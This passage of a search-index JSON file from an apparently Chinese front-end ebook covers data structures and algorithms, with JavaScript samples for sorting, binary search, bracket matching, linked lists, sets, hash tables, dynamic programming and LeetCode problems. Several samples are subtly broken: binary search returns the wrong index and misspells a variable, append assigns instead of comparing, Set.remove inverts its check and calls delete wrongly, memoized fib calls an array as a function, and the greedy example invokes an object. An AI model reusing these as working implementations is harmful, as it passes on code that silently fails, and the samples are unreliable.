<p>\u7ed3\u6784\u5316\u8bbe\u8ba1\u6a21\u5f0f\uff1a\u5916\u89c2\u3001\u9002\u914d\u5668\u3001\u4ee3\u7406\u3001\u88c5\u9970\u5668\u3001\u4eab\u5143\u6a21\u5f0f\u3001\u6865\u63a5\u3001\u7ec4\u5408</p> <p>\u884c\u4e3a\u8bbe\u8ba1\u6a21\u5f0f\uff1a\u7b56\u7565\u3001\u6a21\u677f\u65b9\u6cd5\u3001\u89c2\u5bdf\u8005\u3001\u8fed\u4ee3\u5668\u3001\u8d23\u4efb\u94fe\u3001\u547d\u4ee4\u3001\u5907\u5fd8\u5f55\u3001\u72b6\u6001\u3001\u8bbf\u95ee\u8005\u3001\u7ec8\u7ed3\u8005\u3001\u89e3\u91ca\u5668\u7b49</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"12-3 \u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 14636  \u9605\u8bfb30\u5206\u949f</p> <p>\u4e3b\u8981\u662f\u4e0b\u53bb\u81ea\u5df1\u591a\u5237\u9898</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_1","title":"\u77e5\u8bc6\u70b9","text":"<p>\u7b97\u6cd5\u590d\u6742\u5ea6\u3001\u7b97\u6cd5\u7a33\u5b9a\u6027\uff08\u6570\u7ec4\u64cd\u4f5c\u4e2d\u662f\u5426\u6539\u53d8\u539f\u59cb\u6570\u636e\uff0c\u901a\u5e38\u7a33\u5b9a\u6027\u597d\u7684\u7b97\u6cd5\u7a7a\u95f4\u590d\u6742\u5ea6\u8f83\u9ad8\uff09\uff1b\u5e38\u89c1\u7b97\u6cd5\u548c\u601d\u8def\uff08\u5192\u6ce1\u6392\u5e8f\uff0c\u63d2\u5165\u6392\u5e8f\uff0c\u5feb\u901f\u6392\u5e8f-\u4e8c\u5206\u9012\u5f52\u3001\u6570\u7ec4flat\u3001\u67e5\u627e\u7b97\u6cd5\uff09\u6570\u636e\u7ed3\u6784\uff08\u6570\u7ec4\uff0c\u961f\u5217\u3001\u6808\u3001\u6811\u3001\u54c8\u5e0c\u8868\u3001\u96c6\u5408\u3001\u94fe\u8868\u3001\u56fe\u3001\u7ea2\u9ed1\u6811\u3001DFS\uff09\uff1b\u52a8\u6001\u89c4\u5212\uff0c\u8d2a\u5fc3\u7b97\u6cd5\u7b49\u3002</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_2","title":"\u7b97\u6cd5\u4f18\u52a3","text":"<p>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u5927O\u8868\u793a\u6cd5\uff0c\u4e8c\u5206\u53d6\u5bf9\u6570</p> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u5185\u5b58\uff08\u51cf\u5c11\u5185\u90e8\u7f13\u5b58\u6570\u7ec4\u7b49\uff09\u5feb\u901f\u6392\u5e8f\u4e2d\u4f7f\u7528\u6307\u9488\u4ee3\u66ff\u5de6\u53f3\u6570\u7ec4</p> <p>\u7b97\u6cd5\u7a33\u5b9a\u6027</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_3","title":"\u5192\u6ce1\u6392\u5e8f","text":"<p>\u6700\u5deeN\u5e73\u65b9\uff0c\u6ce8\u610f\u8fb9\u754c\u6761\u4ef6</p> <pre><code>function bubble(arr) {\n  let len = arr.length;\n  for (let i = 0; i &lt; len; i++) {\n    for (let j = 0; j &lt; len - i - 1; j++) {\n      if (arr[j] &gt; arr[j + 1]) {\n        // \u8c03\u6362\u987a\u5e8f\n        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];\n       // \u53ef\u4ee5\u4f7f\u7528\u666e\u901a\u8c03\u6362\u987a\u5e8f let c = a; a = b; b = c; \u8c03\u6362\u987a\u5e8f \n      }\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_4","title":"\u5feb\u901f\u6392\u5e8f","text":"<p>\u4e8c\u5206+\u9012\u5f52 N * logN</p> <p>\u53ef\u4ee5\u501f\u52a9\u4e24\u4e2a\u8f85\u52a9\u7684\u6570\u7ec4</p> <pre><code>function quick(arr) {\n  if (arr.length &lt;= 1) return arr;\n  let flag = arr.shift();\n  let left = [];\n  let right = [];\n  for (let i = 0; i &lt; arr.length; i++) {\n    if (arr[i] &lt; flag) {\n      left.push(arr[i]);\n    } else {\n      right.push(arr[i]);\n    }\n  }\n  return quick(left).concat(flag, ...quick(right));\n}\n</code></pre> <p>\u6216\u8005\u501f\u52a9\u4e24\u4e2a\u8f85\u52a9\u7684\u6307\u9488\u5b8c\u6210\uff08\u8282\u7701\u5185\u5b58\uff09</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_5","title":"\u6570\u7ec4\u6241\u5e73\u5316","text":"<p>\u4f7f\u7528\u9012\u5f52\u5904\u7406</p> <pre><code>function flat(arr) {\n  let res = [];\n  arr.forEach((item, index) =&gt; {\n    if (Array.isArray(item)) {\n      res = res.concat(flat(item));\n    } else {\n      res.push(item);\n    }\n  });\n  return res;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_6","title":"\u722c\u697c\u7b97\u6cd5","text":"<p>\u6709\u5341\u4e2a\u53f0\u9636\uff0c\u6bcf\u6b21\u53ef\u4ee5\u722c\u53471\u4e2a\u6216\u80052\u4e2a\uff0c\u6709\u591a\u5c11\u4e2d\u722c\u697c\u7684\u60c5\u51b5</p> <p>\u601d\u8def1\uff1a\u5206\u6cbb\u7b97\u6cd5\uff1a\u9996\u5148\u770b\u770b\u6709\u591a\u5c11\u4e2a\u60c5\u51b5\u7684\u7ec4\u5408\uff08\u5916\u90e8\u5faa\u73af\uff09\u7136\u540e\u5185\u90e8\u5faa\u73af\u6392\u5217\u7ec4\u5408\u4e00\u4e0b\u8fd9\u4e9b\u60c5\u51b5\uff0c\u4e0d\u597d</p> <p>\u601d\u8def2\uff1a\u8d2a\u5fc3\u7b97\u6cd5\uff08\u786c\u5e01\u627e\u96f6\u95ee\u9898\uff09</p> <p>\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u7684\u601d\u8def\uff0c\u8fd4\u56de\u6765\u5c31\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\u3002\u722c10\u4e2a\u53f0\u9636\u7684\u7b97\u6cd5 = \u722c8\u4e2a\u53f0\u9636\uff08\u6700\u540e\u4e00\u6b21\u4e24\u4e2a\u53f0\u9636\uff09+ \u722c9\u4e2a\u53f0\u9636\uff08\u6700\u540e\u4e00\u6b21\u4e00\u4e2a\u53f0\u9636\uff09 fn(x) = fn(x-1) + fn(x-2) \u5173\u952e\u5c31\u662f\u6c42\u521d\u59cb\u5316\u7684\u51e0\u4e2a\u503c\uff0c\u540e\u9762\u7684\u9012\u5f52\u8ba1\u7b97\u3002\u4e2d\u95f4\u589e\u52a0\u4e00\u4e2a\u5217\u8868\u5b58\u50a8\u5df2\u7ecf\u8ba1\u7b97\u7684\u7ed3\u679c\uff0c\u4f18\u5316\u7b97\u6cd5\u3002</p> <pre><code>let stair = function(n) {\n  if (n &lt; 0) {\n    return 0;\n  }\n  else if (n === 0) {\n    return 1;\n  }\n  else if (n &gt; 0) {\n    return stair(n - 1) + stair(n - 2)\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_7","title":"\u4e8c\u5206\u67e5\u627e\u7b97\u6cd5","text":"<p>\u4e8c\u5206\u6cd5\u9002\u5e94\u4e8e\u5df2\u7ecf\u6392\u5e8f\u597d\u7684\u6570\u7ec4\uff0c\u53ef\u4ee5\u4f7f\u7528\u5faa\u73af\u6216\u8005\u9012\u5f52\u5b9e\u73b0</p> <p>\u5faa\u73af\u5b9e\u73b0</p> <pre><code>/**\n * [binary find]\n * @author Michael An\n * @DateTime 2021-10-28T17:44:09+0800\n * @param    {[array]}                 arr   [sorted arr]\n * @param    {[number]}                target\n * @return   {[number]}                [if find, return index, else return -1]\n */\nfunction binary(arr, target) {\n  let low = 0;\n  let high = arr.length - 1;\n  let mid;\n  while (low &lt; high) {\n    mid = Math.floor((low + high) / 2);\n    if (target === arr[mid]) {\n      return (mid + 1);\n    }\n    if (target &lt; arr[mid]) {\n      high = mid - 1;\n    }\n    else if (target &gt; arr[mid]) {\n      low = mid + 1;\n    }\n  }\n  return -1;\n}\n</code></pre> <p>\u9012\u5f52\u5b9e\u73b0</p> <pre><code>function binary(arr, target, low = 0, high) {\n  high = high || arr.length - 1;\n  const n = Math.floor((low + high) / 2);\n  const cur = arr[n];\n  if (cur === target) {\n    return (n + 1);\n  } else if (cur &gt; target) {\n    return binary(arr, target, low, n - 1);\n  } else if (cur &lt; target) {\n    return binary(arr, taregt, n + 1, high);\n  }\n  return -1;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_8","title":"\u5224\u65ad\u62ec\u53f7\u662f\u5426\u6210\u5bf9","text":"<p>\u6216\u8005\u5224\u65ad\u4e00\u6bb5HTML\u662f\u5426\u5b8c\u6574\uff0c\u53ef\u4ee5\u4f7f\u7528\u6808\u5224\u65ad</p> <p>\u5148\u89e3\u6790\u6807\u7b7e\u4e2d\u7684\u90e8\u5206&lt;&gt;\uff0c\u7136\u540e\u628a\u5185\u5bb9\u653e\u5165\u6808\uff1b\u7136\u540e\u5339\u914d ,\u4ece\u6808\u4e2d\u5bfc\u51fa\u5bf9\u5e94\u7684\u90e8\u5206\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u4f7f\u7528\u6b63\u5219\u7b49\u83b7\u53d6\u6807\u7b7e\u90e8\u5206\u3002</p> <p>\u6211\u4eec\u4f7f\u7528\u6570\u7ec4\u6a21\u62df\u4e00\u4e2a\u6808\uff08\u5b9e\u9645\u4e0aJS\u6570\u7ec4\u76f4\u63a5\u53ef\u4ee5\u4f7f\u7528\uff09</p> <pre><code>class Stack {\n  constructor() {\n    this.items = [];\n  }\n  push(item) {\n    this.items.push(item);\n  }\n  pop() {\n    return this.items.pop();\n  }\n  size() {\n    return this.items.length;\n  }\n}\n</code></pre> <p>\u5224\u65ad\u62ec\u53f7\u662f\u5426\u5339\u914d</p> <pre><code>/**\n * [isBalance check a string is balance]\n * @author Michael An\n * @DateTime 2021-10-28T17:58:47+0800\n * @param    {[string]}                 symbol\n * @return   {Boolean} \n */\nfunction isBalance(symbol) {\n  const stack = new Stack();\n  const left = '{[(';\n  const right = '}])';\n  let flag = true;\n  for (let i = 0; i &lt; symbol.length; i++) {\n    let s = symbol[i];\n    if (left.includes(s)) {\n      stack.push(s);\n    }\n    else if (right.includes(s)) {\n      let res = stack.pop();\n      if (left.indexOf(res) !== right.indexOf(s)) {\n        flag = false;\n        return flag;\n      }\n    }\n  }\n  if (stack.size() !== 0) {\n    return false;\n  }\n  return true;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_9","title":"\u94fe\u8868","text":"<p>\u94fe\u8868\u5b58\u50a8\u4e00\u4e2a\u6570\u636e+\u6307\u9488\uff08fiber\u7684\u67b6\u6784\u5c31\u662f\u94fe\u8868 linkedList\uff09</p> <p>\u9996\u5148\u6784\u5efa\u6570\u636e\u7ed3\u6784</p> <pre><code>class Node {\n  constructor(element) {\n    this.element = element;\n    this.next = null;\n  }\n}\n\nclass LinkedList {\n  constructor() {\n    this.head = null;\n    this.current;\n    this.length = 0;\n  }\n\n  append(ele) {\n    const node = new Node(ele);\n    if (this.head = null) {\n      this.head = node;\n    } else {\n      this.current = this.head;\n      while (this.current.next) {\n        this.current = this.current.next;\n      }\n      this.current.next = node;\n    }\n    this.length++;\n  }\n\n  // \u5176\u4ed6API\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_10","title":"\u96c6\u5408","text":"<p>\u6ca1\u6709\u91cd\u590d\u6570\u636e\uff08set\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u6a21\u62df</p> <pre><code>class Set {\n  constructor() {\n    this.items = {};\n  }\n  has(value) {\n    return this.items.hasOwnProperty(value);\n  }\n  add(value) {\n    if (!this.has(value)) {\n      this.items[value] = value;\n      return true;\n    }\n    return false;\n  }\n  remove(value) {\n    if (!this.has(value)) {\n      delete this.items(value);\n      return true;\n    }\n    return false;\n  }\n  getSize() {\n    return Object.keys(this.items).length;\n  }\n  getValues() {\n    return Object.keys(this.items);\n  }\n}\n\nconst set = new Set();\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_11","title":"\u54c8\u5e0c\u8868","text":"<p>\u4f7f\u7528\u5bf9\u8c61\u6a21\u62df\uff1a\u952e\u9700\u8981\u7ecf\u8fc7\u6563\u5217\u51fd\u6570\u8ba1\u7b97\uff0c\u83b7\u53d6\u6563\u5217\u503c\uff0c\u7136\u540e\u5bf9\u5e94\u5806\u5185\u5b58\u5730\u5740</p> <pre><code>class HashTable {\n  constructor() {\n    this.items = [];\n  }\n  get() {\n\n  }\n  set(key, value) {\n    const hash = this.keyToNum(key);\n    this.items[hash] = value;\n  }\n\n}\n</code></pre> <p>\u6563\u5217\u51fd\u6570\uff0c\u5904\u7406\u54c8\u5e0c\u78b0\u649e\uff08\u5b58\u50a8\u5217\u8868\u65b9\u5f0f\u89e3\u51b3\uff09\u76f8\u540c\u7684\u54c8\u5e0c\u503c\uff0c\u653e\u5728\u4e00\u4e2a\u5217\u8868\u4e2d\u5904\u7406</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_12","title":"\u6811","text":"<p>\u6839\u8282\u70b9\u3001\u5b50\u8282\u70b9\u3001DFS\u3001\u4e8c\u53c9\u6811</p> <p>DOM \u6811\uff08\u904d\u5386\u6811\u7684\u65b9\u6cd5\uff09</p> <pre><code>let dom = '#app';\nwalk(dom, (node) =&gt; {\n  console.log(node);\n});\n\nfunction walk(node, fn) {\n  if (!node || !fn) return null;\n  if (node instanceof window.Node) {\n    _walk(node, fn);\n  }\n  return node;\n}\n\nfunction _walk(node, fn) {\n  if (fn(node) !== false) {\n    node = node.firstChild;\n    while (node) {\n      _walk(node, fn);\n      node = node.nextSibling;\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_13","title":"\u52a8\u6001\u89c4\u5212","text":"<p>\u52a8\u6001\u89c4\u5212\uff1a\u9996\u5148\u4f7f\u7528\u66b4\u529b\u89e3\u6cd5 -&gt;\u5982\u679c\u53ef\u4ee5\u6709\u66f4\u597d\u7684\u529e\u6cd5\uff0c\u90a3\u4e48\u4f7f\u7528\u66f4\u597d\u7684\u529e\u6cd5</p> <p>\u8d2a\u5fc3\u7b97\u6cd5\u76f8\u53cd\uff0c\u4f18\u5148\u4f7f\u7528\u6027\u4ef7\u6bd4\u6700\u597d\u7684\u7b56\u7565\uff08\u4f46\u662f\u7ed3\u679c\u4e0d\u4e00\u5b9a\u662f\u6700\u597d\u7684\uff09\uff1b\u52a8\u6001\u89c4\u5212\u5148\u4f7f\u7528\u6027\u4ef7\u6bd4\u6700\u4f4e\u7684\u65b9\u6cd5\uff0c\u9010\u6b65\u8ba1\u7b97\u9010\u6b65\u4f7f\u7528\u6027\u4ef7\u6bd4\u8f83\u9ad8\u7684\u65b9\u6cd5\u8fed\u4ee3\u4e4b\u524d\u7684\u65e7\u529e\u6cd5\u3002</p> <p>\u627e\u96f6\u94b1\uff0c\u80cc\u5305\u95ee\u9898\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u7b97\u6cd5\u3002</p> <p>\u4f8b\u5982\uff0c\u6590\u6ce2\u90a3\u5951\u6570\u5217</p> <pre><code>// \u4e0d\u65ad\u9012\u5f52\u8c03\u7528\uff0c\u4f1a\u9020\u6210\u5927\u91cf\u7684\u91cd\u590d\u8ba1\u7b97\nfunction fib(n) {\n  if (n &lt;= 0) return 0;\n  if (n === 1 || n === 2) return 1;\n  return fib(n - 1) + fib (n - 2);\n}\n</code></pre> <p>\u6211\u4eec\u5148\u4f7f\u7528\u7f13\u5b58\u4f18\u5316\u7b97\u6cd5</p> <pre><code>let dict = [];\n\nfunction fib(n) {\n  if (dict[n]) {\n    return dict(n);\n  } else {\n    let result = fib(n - 1) + fib (n - 2);\n    dict[n] = result;\n    return result;\n  }\n}\n</code></pre> <p>\u52a8\u6001\u89c4\u5212\uff1a\u81ea\u4e0b\u800c\u4e0a\uff0c\u5148\u8ba1\u7b97 fn(1), fn(2) \u4e4b\u540e\u8ba1\u7b97 fn(20)</p> <pre><code>function fib(n) {\n  if (n === 1 || n === 2) return 1;\n  let dp = [];\n  dp[1] = dp[2] = 1;\n  for (let i = 3; i &lt;= n; i++) {\n    dp[i] = dp[i - 1] + dp[i - 2];\n  }\n  return dp[n];\n}\n</code></pre> <p>\u52a8\u6001\u89c4\u5212\u627e\u96f6\u94b1\u7b97\u6cd5\uff08\u8bb0\u5f55\u6bcf\u4e00\u6b65\u7684\u7f13\u5b58\uff0c\u5224\u65ad\u4e0b\u4e00\u6b65\u7684\u6700\u4f73\u503c\uff09</p> <pre><code>class Change {\n  constructor(changeType) {\n    this.changeType = changeType;\n    this.cache = {};\n  }\n  makeChange(amount) {\n    let min = [];\n    if (!amount) return [];\n    // \u4ece\u7f13\u5b58\u4e2d\u8bfb\u53d6\u6570\u91cf\n    if (this.cache[amount]) {\n      return this.cache[amount];\n    }\n\n    for (let i = 0; i &lt; this.changeType.length; i++) {\n      const leftAmount = amount - this.changeType[i];\n      let newMin;\n      if (leftAmount &gt;= 0) {\n        // \u627e\u96f6\u540e\uff0c\u8fd8\u6709\u5269\u4f59\uff0c\u90a3\u4e48\u7ee7\u7eed\u627e\u96f6\n        newMin = this.makeChange(leftAmount);\n      }\n      if (leftAmount &gt;= 0 &amp;&amp; (newMin.length &lt; min.length - 1 || !min.length)) {\n        // \u52a8\u6001\u89c4\u5212\uff08\u5982\u679c\u65b0\u7684\u65b9\u6848\u6bd4\u65e7\u7684\u65b9\u6848\u597d\uff0c\u90a3\u4e48\u4f7f\u7528\u65b0\u7684\u65b9\u6cd5\uff09\n        min = [this.changeType[i]].concat(newMin);\n      }\n    }\n    return this.cache[amount] = min;\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_14","title":"\u8d2a\u5fc3\u7b97\u6cd5","text":"<p>\u8fd1\u4f3c\u6c42\u89e3\uff1a\u5f53\u80fd\u6ee1\u8db3\u5927\u90e8\u5206\u60c5\u51b5\u7684\u65f6\u5019\uff0c\u5c31\u8ba4\u4e3a\u903b\u8f91\u6b63\u786e\u3002\u4f7f\u7528\u7b97\u6cd5\u524d\uff0c\u9700\u8981\u786e\u5b9a\u7b97\u6cd5\u662f\u5426\u9002\u7528\u4e8e\u8fd9\u4e2a\u95ee\u9898\u3002</p> <pre><code>class Change {\n  constructor(changeType) {\n    // \u5148\u628a\u96f6\u94b1\u6392\u5e8f\n    this.changeType = changeType.sort((r1, r2) =&gt; r2 - r1);\n  }\n\n  makeChange(amount) {\n    const arr = [];\n    for (let i = 0; i &lt; this.changeType.length; i++) {\n      while (amount - this.changeType[i] &gt;= 0) {\n        arr.push(this.changeType[i]);\n        amount = amount - this.changeType[i];\n      }\n    }\n    return arr;\n  }\n}\n\nconst change = new Change([1,2,10,50,20,100]);\n\nchange(12345);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_15","title":"\u524d\u7aef\u6570\u636e\u7ed3\u6784","text":"<p>virtual dom</p> <p>fiber</p> <p>Hooks</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_16","title":"\u5e38\u89c1\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":""},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_17","title":"\u5e38\u7528\u6570\u636e\u7ed3\u6784","text":"<p>\u6570\u7ec4\uff1a\u6570\u636e\u8fde\u7eed\uff0c\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u968f\u673a\u8bbf\u95ee\u3002\u589e\u52a0\u548c\u5220\u9664\u590d\u6742\u5ea6N\uff08\u9700\u8981\u6539\u53d8\u5143\u7d20\u7684\u5185\u5b58\uff09\uff1b\u6839\u636e\u7d22\u5f15\u67e5\u627e\u590d\u6742\u5ea61\uff0c\u6839\u636e\u503c\u67e5\u627e\u590d\u6742\u5ea6N\u3002\u6709\u5e8f\u7684\u5b58\u50a8\u65b9\u5f0f\u3002</p> <p>\u94fe\u8868\uff1a\u975e\u8fde\u7eed\u7684\u5b58\u50a8\uff1a\u589e\u52a0\u5220\u9664\u90fd\u662f1\uff0c\u67e5\u627e\u662fN\u3002</p> <p>\u54c8\u5e0c\u8868\uff1a\u4e86\u89e3\u6563\u5217\u51fd\u6570\uff0c\u54c8\u5e0c\u78b0\u649e-\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u94fe\u8868\u5b58\u50a8\u78b0\u649e\u7684\u5143\u7d20\uff08\u6216\u8005\u54c8\u5e0c\u6570\u7ec4\u6269\u5bb9\uff09\u3002\u54c8\u5e0c\u8868\u589e\u5220\u67e5\u7684\u590d\u6742\u5ea6\u90fd\u662f1\uff0c\u6d88\u8017\u5185\u5b58\u7a7a\u95f4\u3002</p> <pre><code>let arr = new Array(10).fill('');\nfunction hash(s) {\n  return s.charCodeAt() * 37 % 10;\n}\n</code></pre> <p>\u6811\uff1a\u5fc5\u987b\u638c\u63e1\uff08\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u6811\uff0cAST\uff09\uff0cDOM\u8282\u70b9\u6811\u7684\u64cd\u4f5c\uff1b</p> <p>\u4e8c\u53c9\u6811\u53ef\u4ee5\u8f6c\u6362\u6210\u6570\u7ec4\u3002\u6bcf\u4e00\u5c42\u90fd\u662f2N\u6b21\u65b9\u3002</p> <p>\u5de6\u8fb9\u7684\u5143\u7d20\u662f 2N\uff0c\u53f3\u8fb9\u7684\u5143\u7d20\u662f 2N(\u6b21\u65b9) + 1</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_18","title":"\u5e38\u7528\u7b97\u6cd5","text":"<p>\u6392\u5e8f\uff08\u5192\u6ce1\u3001\u5feb\u901f\uff09</p> <p>\u641c\u7d22\uff08\u4e8c\u5206\uff09</p> <p>\u56de\u6eaf\u3001\u8d2a\u5fc3\u3001\u52a8\u6001\u89c4\u5212</p> <p>\u9012\u5f52\uff08\u6570\u7ec4\u6253\u5e73\u3001\u62ec\u53f7\u5339\u914d\uff0cHTML\u6807\u7b7e\u5339\u914d\u7b49\u3001\u6811\u8ba1\u7b97\uff09</p> <pre><code>let app = document.getElementById('app');\nlet fn = (node) =&gt; {console.log(node);};\nwalk(app, fn);\n\nfunction walk(node, func = () =&gt; {}) {\n  if (node instanceof window.Node) {\n    _walk(node, func);\n  }\n  return node;\n}\n\nfunction _walk(node, func) {\n  if (func(node) !== false) {\n    node = node.firstChild;\n    while(node) {\n      _walk(node, func);\n      node = node.nextSibling;\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_19","title":"\u53c2\u8003\u4e66","text":"<p>\u5165\u95e8\uff1a\u6211\u7684\u7b2c\u4e00\u672c\u7b97\u6cd5\u4e66\u3001\u554a\u54c8\u7b97\u6cd5\u3001\u56fe\u89e3HTTP\uff0c\u56fe\u89e3TCP</p> <p>\u7ecf\u5178\u6559\u6750\uff1a\u7b97\u6cd5-\u7b2c\u56db\u7248\uff08\u4e00\u672c\u4e66\u770b\u4e86\u4e09\u4e2a\u6708\uff0c\u4e60\u9898\u5168\u90e8\u770b\u4e00\u6b21\uff09</p> <p>\u4e3b\u9898\u9605\u8bfb\u6cd5\uff1a\u770b\u4e00\u4e2a\u77e5\u8bc6\u70b9\uff0c\u53ea\u5b66\u4e60\u8fd9\u4e2a\u77e5\u8bc6\u70b9\uff1b\u4e0d\u4f1a\u88ab\u5176\u4ed6\u7684\u6253\u6270</p> <p>\u4e0d\u65ad\u5237\u9898\u624d\u80fd\u63d0\u9ad8\u7b97\u6cd5\uff1aLeetCode \u6309\u7167\u6807\u7b7e\u4e00\u4e2a\u4e00\u4e2a\u5b66\u4e60</p> <p>\u6811\u662f\u590d\u6742\u7684\u5217\u8868\uff0c\u6240\u4ee5\u628a\u5217\u8868\u5404\u79cd\u64cd\u4f5c\u719f\u7ec3\uff0c\u5e76\u5728\u5de5\u4f5c\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u77e5\u8bc6\u70b9</p> <p>\u5e38\u89c1\u7b97\u6cd5\u77e5\u8bc6\u70b9\u56fa\u5b9a\uff0c\u76ee\u6807\u660e\u786e</p> <p>\u4efb\u4f55\u9ad8\u7ea7\u6280\u80fd\uff0c\u9700\u8981\u957f\u65f6\u95f4\u7ec3\u4e60\uff1b\u6211\u4eec\u5e38\u5e38\u653e\u5927\u77ed\u671f\u5b66\u4e60\u7684\u5a01\u529b\uff0c\u7f29\u5c0f\u957f\u671f\u5b66\u4e60\u7684\u5a01\u529b\u3002</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#_20","title":"\u4e60\u9898","text":""},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#00","title":"00 \u6570\u7ec4\u6241\u5e73\u5316","text":"<p>\u9012\u5f52</p> <pre><code>function flat(array) {\n  let res = [];\n  array.forEach((item) =&gt; {\n    if (Array.isArray(item)) {\n      res = res.concat(flat(item));\n    } else {\n      res.push(item);\n    }\n  });\n  return res;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#01","title":"01 \u4e24\u6570\u4e4b\u548c","text":"<p>twoSum \u4f7f\u7528\u54c8\u5e0c\u8868\u5b58\u50a8\u76ee\u6807\u7d22\u5f15\uff0c\u5faa\u73af\u4e00\u6b21</p> <pre><code>var twoSum = function(nums, target) {\n  let obj = {};\n  for (let i = 0; i &lt; nums.length; i++) {\n    let item = nums[i];\n    if (item in obj) {\n      return [obj[item], i]; // find two number and return index\n    } else {\n      obj[target - item] = i;\n    }\n  }\n};\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#46","title":"46 \u5168\u6392\u5217\uff08\u56de\u6eaf\u7b97\u6cd5\uff09","text":"<pre><code>function backtrack(list, temp, nums) {\n  // \u9012\u5f52\u7684\u7ed3\u675f\u6761\u4ef6\n  if (temp.length === nums.length) {\n    return list.push([...temp]);\n  }\n  for (let i = 0; i &lt; nums.length; i++) {\n    if (temp.includes(nums[i])) {\n      continue;\n    }\n    // \u56de\u6eaf\uff08\u653e\u8fdb\u53bb\uff0c\u6267\u884c\uff0c\u629b\u51fa\u6765\uff09\n    temp.push(nums[i]);\n    backtrack(list, temp, nums);\n    temp.pop();\n  }\n}\n\nvar permute = function(nums) {\n  let list = [];\n  let temp = []\n  backtrack(list, temp, nums);\n  return list;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#94","title":"94 